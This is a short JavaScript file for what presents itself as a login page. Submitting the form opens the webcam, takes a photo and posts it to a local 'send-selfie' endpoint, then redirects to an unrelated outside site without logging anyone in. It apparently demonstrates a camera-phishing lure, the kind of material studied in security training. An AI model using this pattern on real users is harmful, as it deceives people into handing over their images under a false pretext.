const form = document.getElementById('loginForm');
const cameraSection = document.getElementById('cameraSection');
const video = document.getElementById('video');
const takePhotoBtn = document.getElementById('takePhoto');
const message = document.getElementById('message');

form.addEventListener('submit', (e) => {
  e.preventDefault();
  cameraSection.style.display = 'block';
  startCamera();
});

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
  } catch (err) {
    message.textContent = "Camera access denied.";
  }
}

takePhotoBtn.addEventListener('click', () => {
  const canvas = document.createElement('canvas');
  const context = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  sendSelfieToEmail(canvas.toDataURL());

  window.location.href = "https://www.gicseh.com";
});

function sendSelfieToEmail(dataUrl) {
  fetch('http://localhost:5000/send-selfie', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ image: dataUrl })
  })
    .then(res => res.json())
    .then(data => {
      message.textContent = "Selfie sent to your email!";
    });
}
